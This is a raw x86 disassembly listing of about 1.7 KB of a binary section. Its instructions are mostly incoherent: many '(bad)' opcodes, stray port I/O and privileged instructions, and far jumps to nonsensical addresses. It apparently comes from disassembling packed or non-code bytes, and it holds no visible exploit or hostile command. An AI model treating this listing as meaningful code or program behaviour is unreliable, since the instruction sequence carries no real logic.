  40e417:	add    cl,BYTE PTR [ebp-0x752f8c97]
  40e41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e41e:	ret    
  40e41f:	xchg   edx,eax
  40e420:	mov    DWORD PTR [edx-0x76bb8640],0xc60bbff4
  40e42a:	pop    esp
  40e42b:	cmp    eax,0x82eb6a50
  40e430:	jmp    DWORD PTR [edx+0x5b]
  40e433:	pop    edx
  40e434:	arpl   WORD PTR ds:0xb88a6e08,bp
  40e43a:	inc    DWORD PTR [ebx]
  40e43c:	cwde   
  40e43d:	icebp  
  40e43e:	pop    edx
  40e43f:	add    al,BYTE PTR [eax]
  40e441:	xchg   BYTE PTR [ecx+0x78],ch
  40e444:	fsubp  st(6),st
  40e446:	popf   
  40e447:	jb     0x40e483
  40e449:	cmp    esp,edi
  40e44b:	and    BYTE PTR [ebx],bh
  40e44d:	dec    ebx
  40e44e:	(bad)  [edi+edi*8]
  40e451:	test   al,0x6f
  40e453:	jge    0x40e4cc
  40e455:	dec    ecx
  40e456:	fadd   QWORD PTR [ebx+0x27]
  40e459:	sbb    eax,0xafe3bf3
  40e45e:	fiadd  WORD PTR [ebx+0xe]
  40e461:	stc    
  40e462:	pop    edi
  40e463:	add    DWORD PTR [eax],eax
  40e465:	jne    0x40e45b
  40e467:	(bad)  
  40e468:	out    dx,eax
  40e469:	(bad)  
  40e46a:	sub    eax,0xc0e3326c
  40e46f:	sub    dh,BYTE PTR [ebp-0x17]
  40e472:	add    esi,esi
  40e474:	test   DWORD PTR [eax],eax
  40e476:	add    BYTE PTR [eax],al
  40e478:	add    BYTE PTR [eax],al
  40e47a:	repnz add ecx,ebp
  40e47d:	add    ecx,DWORD PTR [esi+0x4a87e540]
  40e483:	add    ch,cl
  40e485:	add    edi,esp
  40e487:	cmp    eax,ebp
  40e489:	add    esi,DWORD PTR [ebp-0x20]
  40e48c:	mov    edi,0xdfeea6be
  40e491:	rcl    DWORD PTR [edx-0x5c928f1c],cl
  40e497:	jl     0x40e444
  40e499:	jae    0x40e48a
  40e49b:	rcl    DWORD PTR [eax],0x79
  40e49e:	inc    ecx
  40e49f:	push   esi
  40e4a0:	pop    edi
  40e4a1:	ret    
  40e4a2:	sbb    bh,BYTE PTR [ebp-0x5d]
  40e4a5:	jae    0x40e496
  40e4a7:	rcl    DWORD PTR [ecx+edi*2],0x29
  40e4ab:	push   esi
  40e4ac:	outs   dx,DWORD PTR ds:[esi]
  40e4ad:	ret    
  40e4ae:	out    0x7b,al
  40e4b0:	stos   DWORD PTR es:[edi],eax
  40e4b1:	pop    edi
  40e4b2:	std    
  40e4b3:	repnz mov al,0x78
  40e4b6:	mov    ecx,0xdec42e56
  40e4bb:	add    dh,BYTE PTR [edx-0x41]
  40e4be:	pop    esi
  40e4bf:	sub    al,0x37
  40e4c1:	std    
  40e4c2:	out    0x42,al
  40e4c4:	pusha  
  40e4c5:	ret    
  40e4c6:	sar    DWORD PTR [ebx-0x55],0x73
  40e4ca:	in     eax,dx
  40e4cb:	repnz sar BYTE PTR [eax-0x47],1
  40e4cf:	outs   dx,BYTE PTR ds:[esi]
  40e4d0:	imul   eax,DWORD PTR [esi+ecx*1-0x1f],0xf7976c69
  40e4d8:	ins    DWORD PTR es:[edi],dx
  40e4d9:	jns    0x40e4f5
  40e4db:	push   0x78e8
  40e4e0:	add    BYTE PTR [eax],al
  40e4e2:	add    BYTE PTR [ecx+0x6af3d572],bh
  40e4e8:	pop    edx
  40e4e9:	dec    esi
  40e4ea:	inc    ebp
  40e4eb:	add    ebp,DWORD PTR [eax+0x71]
  40e4ee:	(bad)  
  40e4ef:	or     ch,BYTE PTR [eax+0x38]
  40e4f2:	sbb    ch,bl
  40e4f4:	repz jmp FWORD PTR [ebp+0x248a6859]
  40e4fb:	imul   ebx,ecx,0x13366a13
  40e501:	push   eax
  40e502:	xchg   ecx,eax
  40e503:	mov    esp,0x2f96fe3f
  40e508:	dec    esp
  40e509:	cld    
  40e50a:	mov    ss,WORD PTR [ecx+0x7c]
  40e50d:	dec    esp
  40e50e:	xchg   ebp,eax
  40e50f:	inc    eax
  40e510:	ret    0x694e
  40e513:	stos   DWORD PTR es:[edi],eax
  40e514:	or     BYTE PTR [ebx],bh
  40e516:	jb     0x40e4bb
  40e518:	or     al,0x3b
  40e51a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e51b:	stos   BYTE PTR es:[edi],al
  40e51c:	fidivr WORD PTR [edx]
  40e51e:	inc    edi
  40e51f:	mov    dl,ah
  40e521:	push   ebp
  40e522:	shl    esp,1
  40e524:	pop    edi
  40e525:	(bad)  
  40e526:	push   esi
  40e527:	sbb    DWORD PTR [esi],ecx
  40e529:	adc    al,0x22
  40e52b:	mov    ch,0x67
  40e52d:	push   edi
  40e52e:	mov    al,ds:0x52fe3cf5
  40e533:	xor    BYTE PTR [esi+eax*8],ch
  40e536:	mov    ebp,0xfd702a34
  40e53b:	push   0x7ea98b26
  40e540:	jns    0x40e582
  40e542:	cdq    
  40e543:	int    0xbe
  40e545:	out    dx,eax
  40e546:	bound  eax,QWORD PTR [eax]
  40e548:	add    BYTE PTR [eax],al
  40e54a:	add    BYTE PTR [eax],al
  40e54c:	sbb    ecx,DWORD PTR ss:[ebx+0x407aa29c]
  40e553:	jge    0x40e512
  40e555:	mov    esi,0xef2670eb
  40e55a:	mov    ch,BYTE PTR [edx+ecx*8+0x776d3f3d]
  40e561:	jnp    0x40e5af
  40e563:	aad    0x4a
  40e565:	dec    eax
  40e566:	push   cs
  40e567:	jne    0x40e522
  40e569:	jg     0x40e5ab
  40e56b:	push   esp
  40e56c:	mov    bh,BYTE PTR [esi+0x1f0960ef]
  40e572:	mov    eax,DWORD PTR [eax]
  40e574:	cmp    esi,ebp
  40e576:	out    0xe,al
  40e578:	rcr    edx,0xfd
  40e57b:	jmp    0x3ebeb1
  40e580:	push   edi
  40e581:	inc    ecx
  40e582:	cli    
  40e583:	call   0x3eaf25
  40e588:	fs test dl,0x43
  40e58c:	(bad)  
  40e58e:	adc    ebx,DWORD PTR [eax]
  40e590:	mov    edi,0xf8afe42
  40e595:	(bad)  
  40e596:	ss push 0x422794
  40e59c:	and    edx,DWORD PTR [ecx]
  40e59e:	sbb    BYTE PTR [ebx],dl
  40e5a0:	dec    esp
  40e5a1:	(bad)  
  40e5a2:	imul   ecx,DWORD PTR [eax],0xffe692c4
  40e5a8:	xor    ebx,ebx
  40e5aa:	adc    edx,DWORD PTR [edi+edx*2]
  40e5ad:	aas    
  40e5ae:	(bad)  
  40e5af:	pop    eax
  40e5b0:	add    BYTE PTR [eax],al
  40e5b2:	add    BYTE PTR [eax],al
  40e5b4:	add    ch,al
  40e5b6:	jg     0x40e57e
  40e5b8:	jmp    DWORD PTR [edi]
  40e5ba:	cmc    
  40e5bb:	push   edx
  40e5bc:	dec    DWORD PTR [ecx-0x6]
  40e5bf:	adc    al,BYTE PTR [eax+0x5c]
  40e5c2:	fnstenv [ebx+0x10]
  40e5c5:	xchg   ebx,eax
  40e5c6:	jae    0x40e5d2
  40e5c8:	(bad)  
  40e5c9:	stc    
  40e5ca:	imul   edi,ebp,0x42251c15
  40e5d0:	add    bh,bl
  40e5d2:	ret    0x5f0a
  40e5d5:	adc    dh,BYTE PTR ds:0xa6c7c3c7
  40e5db:	pop    esi
  40e5dc:	push   ebx
  40e5dd:	or     DWORD PTR [ecx+ecx*4+0x70],edx
  40e5e1:	add    al,0x51
  40e5e3:	mov    DWORD PTR [eax-0x10],edi
  40e5e6:	call   0x354:0xfe4fcb16
  40e5ed:	sub    eax,0x75fff905
  40e5f2:	data16 or dl,BYTE PTR [ebx]
  40e5f5:	mov    ch,0x5b
  40e5f7:	rcl    DWORD PTR [ebp-0x12],1
  40e5fa:	daa    
  40e5fb:	and    BYTE PTR [ebx+ecx*2],bl
  40e5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ff:	(bad)  
  40e601:	mov    esi,0xbd8b0418
  40e606:	fdivr  DWORD PTR [esi]
  40e608:	or     esi,esi
  40e60a:	mov    al,ds:0x2e2e7369
  40e60f:	imul   edx,DWORD PTR [ecx+eiz*2],0x68
  40e613:	ret    0xdaff
  40e616:	ds pop ebp
  40e618:	inc    BYTE PTR [eax]
  40e61a:	add    BYTE PTR [eax],al
  40e61c:	add    BYTE PTR [eax],al
  40e61e:	mov    edx,0x28fe6ad8
  40e623:	dec    eax
  40e624:	fadd   QWORD PTR [edi]
  40e626:	sbb    eax,0xa2fe5acb
  40e62b:	pusha  
  40e62c:	dec    edx
  40e62d:	inc    BYTE PTR [eax+0x75423d67]
  40e633:	inc    edx
  40e634:	retf   
  40e635:	jmp    0x5b75:0x87424245
  40e63c:	add    al,BYTE PTR [ebx]
  40e63e:	jo     0x40e6a7
  40e640:	cmp    eax,0x4b007542
  40e645:	je     0x40e5c9
  40e647:	loopne 0x40e613
  40e649:	arpl   ax,si
  40e64b:	stos   BYTE PTR es:[edi],al
  40e64c:	retf   0xa3fe
  40e64f:	adc    ebx,DWORD PTR [esi+eax*8]
  40e652:	push   edx
  40e653:	add    al,0xdd
  40e655:	bt     DWORD PTR [ebx],eax
  40e658:	adc    edi,eax
  40e65a:	inc    edx
  40e65b:	hlt    
  40e65c:	pop    ebp
  40e65d:	or     BYTE PTR [ebx+eiz*4-0x1e],dh
  40e661:	(bad)  
  40e662:	mov    ebp,0xb6db357f
  40e667:	xchg   BYTE PTR [ecx+0x14],ch
  40e66a:	jge    0x40e6b4
  40e66c:	ret    0xbbff
  40e66f:	add    al,BYTE PTR [edi-0x39]
  40e672:	inc    DWORD PTR [eax+0x41]
  40e675:	inc    esi
  40e676:	jbe    0x40e67a
  40e678:	cmp    dl,dl
  40e67a:	out    dx,eax
  40e67b:	jno    0x40e6e5
  40e67d:	jmp    0x0:0x4b72028e
  40e684:	add    BYTE PTR [eax],al
  40e686:	add    BYTE PTR [esi+0x23],ah
  40e689:	jb     0x40e64d
  40e68b:	push   edx
  40e68c:	sub    DWORD PTR [ecx-0x55e6840f],edx
  40e692:	jnp    0x40e6c4
  40e694:	ficom  DWORD PTR [ecx+0x694a9e02]
  40e69a:	loop   0x40e6ee
  40e69c:	add    al,BYTE PTR [ecx]
  40e69e:	or     al,0xae
  40e6a0:	shr    al,0x68
  40e6a3:	popa   
  40e6a4:	or     bl,dl
  40e6a6:	ret    
  40e6a7:	mov    dl,0x57
  40e6a9:	adc    dl,cl
  40e6ab:	jmp    0x40e6b6
  40e6ad:	mov    ds:0x6dcba2c5,al
  40e6b2:	(bad)  
  40e6b4:	adc    DWORD PTR [ecx-0x2f1401fd],ebp
  40e6ba:	sub    al,0xab
  40e6bc:	hlt    
  40e6bd:	stos   BYTE PTR es:[edi],al
  40e6be:	je     0x40e6e8
  40e6c0:	gs aam 0x1f
  40e6c3:	pop    ebp
  40e6c4:	jns    0x40e682
  40e6c6:	pop    ds
  40e6c7:	(bad)  
  40e6c8:	int3   
  40e6c9:	cmp    eax,0xa937710f
  40e6ce:	add    ebp,esi
  40e6d0:	dec    edx
  40e6d1:	imul   eax,DWORD PTR [eax+0x6e],0xc669217f
  40e6d8:	sub    BYTE PTR [esi-0x5f19e98],dh
  40e6de:	ret    
  40e6df:	inc    edx
  40e6e0:	pop    esp
  40e6e1:	sbb    DWORD PTR [ebp+0x3b],0x64
  40e6e5:	imul   ebp,DWORD PTR [ebx+esi*1-0x12],0xddd9
  40e6ed:	add    BYTE PTR [eax],al
  40e6ef:	add    BYTE PTR [edx-0x26],dh
  40e6f2:	call   FWORD PTR [eax-0x3f]
  40e6f5:	fs (bad) 
  40e6f7:	loop   0x40e6a7
  40e6f9:	fs adc al,0xfd
  40e6fc:	push   ecx
  40e6fd:	sar    bh,0x3f
  40e700:	ds pop ecx
  40e702:	push   cs
  40e703:	inc    eax
  40e704:	mov    ecx,0x76e8ff7b
  40e709:	inc    DWORD PTR [edi*8+0xfffc0b1]
  40e710:	mov    ecx,0x73b656db
  40e715:	or     dl,BYTE PTR [ebx]
  40e717:	sub    DWORD PTR [ecx-0x3d],esi
  40e71a:	pop    ebp
  40e71b:	jb     0x40e756
  40e71d:	enter  0xf1c1,0x76
  40e721:	int    0x8a
  40e723:	test   ecx,edi
  40e725:	pop    edi
  40e726:	imul   DWORD PTR [eax+0x22]
  40e729:	jg     0x40e72a
  40e72b:	call   0xa273b6a6
  40e730:	(bad)  
  40e731:	int3   
  40e732:	aaa    
  40e733:	aam    0x13
  40e735:	cmp    DWORD PTR [edx-0x17],eax
  40e738:	popf   
  40e739:	jg     0x40e6ec
  40e73b:	jmp    0xfc28e9b6
  40e740:	cld    
  40e741:	arpl   si,di
  40e743:	ins    DWORD PTR es:[edi],dx
  40e744:	ss hlt 
  40e746:	add    DWORD PTR [esi+esi*2+0x3a000002],0xfffffff7
  40e74e:	push   cs
  40e74f:	gs repnz (bad) 
  40e752:	(bad)  
  40e753:	jmp    0x40e758
  40e758:	add    BYTE PTR [edi-0x2321f03b],cl
  40e75e:	nop
  40e75f:	(bad)  
  40e760:	call   0xf1b55edb
  40e765:	and    al,0x5b
  40e767:	push   ebp
  40e768:	sbb    eax,0x298364cd
  40e76d:	cmp    eax,0x1c00817f
  40e772:	(bad)  
  40e773:	(bad)  
  40e774:	mov    esi,0x422614
  40e779:	add    ebx,edx
  40e77b:	adc    edx,DWORD PTR [edi+edi*1]
  40e77e:	aas    
  40e77f:	(bad)  
  40e780:	out    0xcd,eax
  40e782:	(bad)  
  40e783:	std    
  40e784:	inc    DWORD PTR [edi+0x707487ee]
  40e78a:	test   BYTE PTR [edx+0x5d722bfe],0x69
  40e791:	xor    ah,dh
  40e793:	(bad)  
  40e794:	(bad)  
  40e795:	fdiv   st(7),st
  40e797:	xor    al,0x34
  40e799:	pop    ss
  40e79a:	aas    
  40e79b:	(bad)  
  40e79c:	cmp    BYTE PTR [edx+0x3a],ch
  40e79f:	je     0x40e7ad
  40e7a1:	sbb    esi,DWORD PTR [ecx+0x6]
  40e7a4:	mov    edx,DWORD PTR [edx]
  40e7a6:	mov    BYTE PTR [esi+edi*8-0x15],0xda
  40e7ab:	jmp    0x667d8d0b
  40e7b0:	jbe    0x40e780
  40e7b2:	out    0x4b,eax
  40e7b4:	adc    BYTE PTR [ebx],ch
  40e7b6:	jno    0x40e7c2
  40e7b8:	mov    edx,edx
  40e7ba:	fidiv  DWORD PTR [ebx+0x8]
  40e7bd:	add    BYTE PTR [eax],al
  40e7bf:	add    BYTE PTR [eax],al
  40e7c1:	add    ah,dh
  40e7c3:	and    bh,ch
  40e7c5:	call   FWORD PTR [ebx]
  40e7c7:	mov    DWORD PTR [edx-0x1],0x5c8d0ea1
  40e7ce:	jo     0x40e77a
  40e7d0:	std    
  40e7d1:	jne    0x40e76b
  40e7d3:	(bad)  [ebx+0x8]
  40e7d6:	(bad)  
  40e7d7:	xlat   BYTE PTR ds:[ebx]
  40e7d8:	in     eax,dx
  40e7d9:	jmp    FWORD PTR [ebx+0x482442df]
  40e7df:	test   esi,esi
  40e7e1:	jmp    DWORD PTR [ecx]
  40e7e3:	push   ss
  40e7e4:	mov    eax,DWORD PTR [eax+eax*2+0xe]
  40e7e8:	call   0xfe2a4efb
  40e7ed:	mov    esi,DWORD PTR [ebp+0x2c]
  40e7f0:	pop    esp
  40e7f1:	aad    0x98
  40e7f3:	imul   eax,DWORD PTR [edx],0x57
  40e7f6:	xor    bh,BYTE PTR [edi]
  40e7f8:	or     dl,BYTE PTR [ebx]
  40e7fa:	mov    ch,0x6b
  40e7fc:	gs je  0x40e784
  40e7ff:	pop    eax
  40e800:	out    dx,eax
  40e801:	or     ebx,DWORD PTR [edx]
  40e803:	xlat   BYTE PTR ds:[ebx]
  40e804:	cli    
  40e805:	(bad)  
  40e806:	push   0x7542396f
  40e80b:	in     al,dx
  40e80c:	or     esp,DWORD PTR ds:[edx+0x108acb19]
  40e813:	das    
  40e814:	inc    ebx
  40e815:	(bad)  
  40e816:	cmp    edx,DWORD PTR [ebx+0x31]
  40e819:	fld    TBYTE PTR [edi+edi*8-0x108db3e1]
  40e820:	rol    BYTE PTR [ecx],0x75
  40e823:	imul   esi,DWORD PTR [edi+0x43],0x0
  40e827:	add    BYTE PTR [eax],al
  40e829:	add    BYTE PTR [eax],al
  40e82b:	cdq    
  40e82c:	adc    edx,esp
  40e82e:	out    0xdf,eax
  40e830:	sbb    eax,DWORD PTR [eax+eax*1]
  40e833:	in     al,dx
  40e834:	das    
  40e835:	and    BYTE PTR [eax],ah
  40e837:	or     eax,0x22ee6b
  40e83c:	xor    BYTE PTR [eax],ah
  40e83e:	dec    eax
  40e83f:	popf   
  40e840:	out    dx,eax
  40e841:	(bad)  
  40e842:	jmp    DWORD PTR [edx+0x7d146700]
  40e848:	cmp    al,0xc2
  40e84a:	jmp    DWORD PTR [edi]
  40e84c:	xor    esp,DWORD PTR [ecx+0x65c08ae7]
  40e852:	adc    al,0x69
  40e854:	and    al,0xc2
  40e856:	call   FWORD PTR ds:0x72c78192
  40e85c:	mov    ah,0xaf
  40e85e:	mov    cl,cl
  40e860:	pop    es
  40e861:	or     al,0x89
  40e863:	ror    DWORD PTR [edi],0x10
  40e866:	test   al,0x77
  40e868:	inc    eax
  40e869:	jle    0x40e8d4
  40e86b:	je     0x40e86f
  40e86d:	jmp    0x1080e675
  40e872:	mov    ah,0x4d
  40e874:	popa   
  40e875:	adc    eax,0x3187227a
  40e87a:	div    dh
  40e87c:	xchg   ebp,eax
  40e87d:	call   0x3cc65d85
  40e882:	pop    ds
  40e883:	stc    
  40e884:	add    ecx,ebp
  40e886:	add    esi,DWORD PTR [ecx+edx*1+0x64]
  40e88a:	xchg   edx,eax
  40e88b:	adc    ah,BYTE PTR [ecx-0x18]
  40e88e:	js     0x40e890
  40e890:	add    BYTE PTR [eax],al
  40e892:	add    BYTE PTR [eax],al
  40e894:	(bad)  
  40e895:	and    eax,0x2750469
  40e89a:	push   0xffffffeb
  40e89c:	jbe    0x40e8a0
  40e89e:	fidivr WORD PTR [edi-0xc]
  40e8a1:	add    ecx,ebp
  40e8a3:	add    edi,eax
  40e8a5:	lds    eax,FWORD PTR [esp+edi*4]
  40e8a8:	icebp  
  40e8a9:	fisttp QWORD PTR [eax+eiz*1]
  40e8ac:	int    0xfa
  40e8ae:	dec    eax
  40e8af:	add    al,0x75
  40e8b1:	popa   
  40e8b2:	pop    esp
  40e8b3:	and    ch,dh
  40e8b5:	add    ecx,ebp
  40e8b7:	add    ebp,ebp
  40e8b9:	(bad)
  40e8bc:	out    dx,al
  40e8bd:	test   esp,eax
  40e8bf:	jnp    0x40e873
  40e8c1:	pusha  
  40e8c2:	call   0xe9000322
  40e8c7:	add    esi,ebp
  40e8c9:	(bad)  
  40e8cb:	adc    BYTE PTR [ebp+0x11],dh
  40e8ce:	gs stc 
  40e8d0:	jne    0x40e8d4
  40e8d2:	jmp    0xd4a174b0
  40e8d7:	pop    ds
  40e8d8:	dec    ecx
  40e8d9:	popa   
  40e8da:	sti    
  40e8db:	and    esp,DWORD PTR [esi-0x3e]
  40e8de:	call   0x1167cf47
  40e8e3:	pop    esp
  40e8e4:	and    al,BYTE PTR [ebp+edi*1+0x65]
  40e8e8:	arpl   di,dx
  40e8ea:	dec    DWORD PTR [ecx+eiz*4]
  40e8ed:	pop    edi
  40e8ee:	adc    al,0xdd
  40e8f0:	gs ret 0x71ff
  40e8f4:	pop    ebp
  40e8f5:	and    al,0x2c
  40e8f7:	add    BYTE PTR fs:[eax],al
  40e8fa:	add    BYTE PTR [eax],al
  40e8fc:	add    al,bl
  40e8fe:	adc    BYTE PTR [ecx+ecx*1+0x5c000271],al
  40e905:	xor    eax,0x60114824
  40e90a:	mov    ebx,0xce9de8ff
  40e90f:	punpckldq mm6,DWORD PTR ds:0x34271c24
  40e916:	or     al,0x0
  40e918:	jo     0x40e937
  40e91a:	or     dh,al
  40e91c:	jmp    0xe7b8:0x60c10377
  40e923:	lds    esp,FWORD PTR [edi]
  40e925:	int    0x2
  40e927:	jmp    0xfea139b5
  40e92c:	mov    esi,0x3cff0fd3
  40e931:	frstor [edi-0x24]
  40e934:	stos   BYTE PTR es:[edi],al
  40e935:	pop    ecx
  40e936:	pusha  
  40e937:	mov    BYTE PTR ds:0xa984fa95,ch
  40e93d:	shl    edi,cl
  40e93f:	(bad)  
  40e940:	pop    ebp
  40e941:	pop    edx
  40e942:	cmp    bh,0xe8
  40e945:	jbe    0x40e8d2
  40e947:	or     ebp,0x2e
  40e94a:	pop    edi
  40e94b:	(bad)  
  40e94c:	jmp    0xe99c548f
  40e951:	jbe    0x40e9bc
  40e953:	mov    ecx,gs
  40e955:	jbe    0x40e959
  40e957:	(bad)  
  40e958:	jmp    0x8ca9:0x5735f76
  40e95f:	inc    ebx
  40e960:	or     eax,0x0
  40e965:	add    BYTE PTR [ecx-0x26e1e099],ch
  40e96b:	pusha  
  40e96c:	mov    BYTE PTR [eax],al
  40e96e:	pop    ds
  40e96f:	pop    ebx
  40e970:	mov    DWORD PTR [eax+edi*2+0x4cfffe86],eax
  40e977:	fadd   QWORD PTR [ecx+0xc]
  40e97a:	xlat   BYTE PTR ds:[ebx]
  40e97b:	fbld   TBYTE PTR [edx]
  40e97d:	test   BYTE PTR [ebx+eax*1+0x0],bl
  40e981:	push   0x2e
  40e983:	fadd   QWORD PTR [ecx+0x10]
  40e986:	shl    DWORD PTR [edi+0x22],1
  40e989:	cmp    ah,ah
  40e98b:	mov    edx,0x31da2f5
  40e990:	push   0x23
  40e992:	xchg   ecx,eax
  40e993:	and    ch,BYTE PTR [bx+si]
  40e996:	add    al,0xbb
  40e998:	jmp    0x8b44073f
  40e99d:	(bad)  
  40e99e:	dec    esp
  40e99f:	jno    0x40e9e3
  40e9a1:	and    al,0x54
  40e9a3:	xchg   esi,eax
  40e9a4:	std    
  40e9a5:	jne    0x40e9a3
  40e9a7:	jecxz  0x40ea1b
  40e9a9:	and    al,0x78
  40e9ab:	out    dx,al
  40e9ac:	sub    DWORD PTR [edx],edi
  40e9ae:	fld    QWORD PTR [edx]
  40e9b0:	push   0x25
  40e9b2:	addr16 push ds
  40e9b4:	mov    WORD PTR [eax+ebp*2+0x5e],?
  40e9b8:	push   esi
  40e9b9:	call   0x4091d3
  40e9be:	inc    edi
  40e9bf:	retf   
  40e9c0:	dec    esi
  40e9c1:	push   ebx
  40e9c2:	jecxz  0x40e9fd
  40e9c4:	and    ah,BYTE PTR [eax]
  40e9c6:	hlt    
  40e9c7:	push   edx
  40e9c8:	aaa    
  40e9c9:	add    DWORD PTR [eax],eax
  40e9cb:	add    BYTE PTR [eax],al
  40e9cd:	add    BYTE PTR [eax],al
  40e9cf:	pushf  
  40e9d0:	ins    BYTE PTR es:[edi],dx
  40e9d1:	and    eax,0x7a70d48b
  40e9d6:	and    al,0xb4
  40e9d8:	call   0x8b00:0x52eaee6
  40e9df:	fist   DWORD PTR [ebp+0x26a8ff51]
  40e9e5:	and    al,ch
  40e9e7:	enter  0xfd,0x0
  40e9eb:	jne    0x40e9cf
  40e9ed:	(bad)  
  40e9ee:	and    ecx,DWORD PTR [ecx-0x6adc384b]
  40e9f4:	outs   dx,DWORD PTR ds:[esi]
  40e9f5:	(bad)  
  40e9f6:	push   esi
  40e9f7:	out    dx,al
  40e9f8:	lahf   
  40e9f9:	es sbb al,dh
  40e9fc:	adc    al,0xd9
  40e9fe:	pop    es
  40e9ff:	(bad)  
  40ea00:	scas   al,BYTE PTR es:[edi]
  40ea01:	push   cs
  40ea02:	mov    ebp,DWORD PTR [eax-0x11fc92a5]
  40ea08:	lahf   
  40ea09:	es adc al,0xe8
  40ea0c:	scas   eax,DWORD PTR es:[edi]
  40ea0d:	es sbb ch,al
  40ea10:	or     al,0xd8
  40ea12:	and    esp,DWORD PTR [ecx-0x5601b930]
  40ea18:	inc    edi
  40ea19:	(bad)  
  40ea1a:	push   esi
  40ea1b:	or     eax,0x12fe525c
  40ea20:	ins    DWORD PTR es:[edi],dx
  40ea21:	(bad)  
  40ea22:	and    ebx,DWORD PTR [ecx+0x5d23c6d2]
  40ea28:	xor    eax,DWORD PTR [edi-0x7acb053f]
  40ea2e:	jnp    0x40e9c9
  40ea30:	push   edi
  40ea31:	add    dh,BYTE PTR [ebp+0x0]
  40ea34:	add    BYTE PTR [eax],al
  40ea36:	add    BYTE PTR [eax],al
  40ea38:	jp     0x40ea3a
  40ea3a:	loope  0x40ea47
  40ea3c:	imul   edx,DWORD PTR [ecx],0x33917b8d
  40ea42:	mov    ebx,DWORD PTR [ebx-0x67]
  40ea45:	aaa    
  40ea46:	ins    DWORD PTR es:[edi],dx
  40ea47:	or     cl,BYTE PTR [esi+0x7b741026]
  40ea4d:	adc    al,0x6c
  40ea4f:	arpl   WORD PTR [edi+0x318a6174],si
  40ea55:	inc    edi
  40ea56:	cli    
  40ea57:	test   BYTE PTR [edx+0x398d2f5f],ch
  40ea5d:	inc    edi
  40ea5e:	retf   0xece7
  40ea61:	lock add eax,DWORD PTR [eax]
  40ea64:	(bad)  
  40ea65:	daa    
  40ea66:	sub    BYTE PTR [esi+esi*8],bl
  40ea69:	add    cl,bh
  40ea6b:	jecxz  0x40e9ef
  40ea6d:	mov    ah,BYTE PTR [esi+0xcc6efeb]
  40ea73:	clc    
  40ea74:	std    
  40ea75:	ret    
  40ea76:	lods   al,BYTE PTR ds:[esi]
  40ea77:	mov    ?,WORD PTR [ecx-0x3136d10e]
  40ea7d:	add    dh,BYTE PTR [eax-0x1f]
  40ea80:	ret    0xae8b
  40ea83:	out    0x5d,eax
  40ea85:	ret    
  40ea86:	sub    esp,DWORD PTR [edx+0x4b]
  40ea89:	(bad)  
  40ea8a:	lods   al,BYTE PTR ds:[esi]
  40ea8b:	daa    
  40ea8c:	lods   eax,DWORD PTR ds:[esi]
  40ea8d:	push   0xffffffbc
  40ea8f:	mov    esi,0xc7615d3a
  40ea94:	push   esi
  40ea95:	(bad)  
  40ea96:	popa   
  40ea97:	sar    BYTE PTR [edx+0x1],1
  40ea9a:	sub    BYTE PTR [eax+eax*1+0x0],cl
  40eaa1:	mov    eax,0x8ec926ea
  40eaa6:	add    al,BYTE PTR [eax]
  40eaa8:	sbb    dl,BYTE PTR [eax]
  40eaaa:	pop    ebp
  40eaab:	in     eax,dx
  40eaac:	mov    bh,0xff
  40eaae:	ins    DWORD PTR es:[edi],dx
  40eaaf:	push   0x2948081f
  40eab4:	add    al,0x75
  40eab6:	mov    cl,0x61
  40eab8:	mov    edi,0xd835b47a
  40eabd:	gs adc esi,eax
  40eac0:	sbb    eax,0x1b51d5c2
  40eac5:	pop    eax
  40eac6:	push   cs
  40eac7:	aaa    
  40eac8:	jmp    0x8675:0x45298da
  40eacf:	test   al,0xd8
  40ead1:	and    edx,ebp
  40ead3:	add    BYTE PTR [ebp+0x37],cl
  40ead6:	add    dl,BYTE PTR [esi+0x28f186f7]
  40eadc:	add    al,0x6c
  40eade:	fcomip st,st(4)
  40eae0:	loope  0x40eb16
  40eae2:	push   esp
  40eae3:	and    al,0x5d
  40eae5:	jbe    0x40eaea
  40eae7:	add    ch,bh
  40eae9:	imul   ecx,DWORD PTR [ecx+0x70197233],0xffffffe5
  40eaf0:	data16 adc al,0x80
  40eaf3:	neg    DWORD PTR [esi-0x63]
  40eaf6:	and    al,0x69
  40eaf8:	sub    DWORD PTR [ecx],eax
  40eafa:	pop    esp
  40eafb:	(bad)  
  40eafc:	jmp    0x3274f072
  40eb01:	cmp    BYTE PTR [ecx+eax*4-0x3f],bl
  40eb05:	add    BYTE PTR [eax],al
  40eb07:	add    BYTE PTR [eax],al
  40eb09:	add    BYTE PTR [edx+0x5c],al
  40eb0c:	jae    0x40eb03
  40eb0e:	not    bl
  40eb10:	jl     0x40eafb
  40eb12:	and    edx,DWORD PTR [esi]
  40eb14:	mov    esi,DWORD PTR [ecx]
  40eb16:	ror    DWORD PTR [ebp-0x792be11a],1
  40eb1c:	mov    edi,0xff547b9d
  40eb21:	out    0x43,eax
  40eb23:	es inc edi
  40eb25:	ret    0x843
  40eb28:	jl     0x40eb69
  40eb2a:	or     esp,esi
  40eb2c:	retf   0x76aa
  40eb2f:	pop    ebx
  40eb30:	adc    al,0xd1
  40eb32:	add    DWORD PTR [eax+eax*1],ebx
  40eb35:	out    0x2b,al
  40eb37:	or     al,0xff
  40eb39:	push   esp
  40eb3a:	gs scas eax,DWORD PTR es:[edi]
  40eb3c:	(bad)  
  40eb3d:	cld    
  40eb3e:	add    BYTE PTR [edi+0x42],0xe9
  40eb42:	icebp  
  40eb43:	aas    
  40eb44:	or     esp,DWORD PTR [esi]
  40eb46:	mov    bh,0xb8
  40eb48:	pop    esp
  40eb49:	stos   BYTE PTR es:[edi],al
  40eb4a:	into   
  40eb4b:	repz retf 0x792a
  40eb4f:	pop    ebx
  40eb50:	adc    al,0xd1
  40eb52:	rcr    DWORD PTR [ebx],0x0
  40eb55:	fidiv  DWORD PTR [esi]
  40eb57:	sbb    esp,DWORD PTR [esi+0x70]
  40eb5a:	mov    dl,0x58
  40eb5c:	add    eax,0xe3683d62
  40eb61:	fs pusha 
  40eb63:	iret   
  40eb64:	inc    esp
  40eb65:	add    BYTE PTR [esi],ah
  40eb67:	or     eax,0x22a0c984
  40eb6c:	xor    eax,eax
  40eb6e:	add    BYTE PTR [eax],al
  40eb70:	add    BYTE PTR [eax],al
  40eb72:	add    BYTE PTR [eax+edi*4],bl
  40eb75:	sub    esi,DWORD PTR [ebp-0x6f]
  40eb78:	ins    DWORD PTR es:[edi],dx
  40eb79:	add    BYTE PTR [eax+0x27],bl
  40eb7c:	add    al,0x80
  40eb7e:	stc    
  40eb7f:	addr16 xor edi,edi
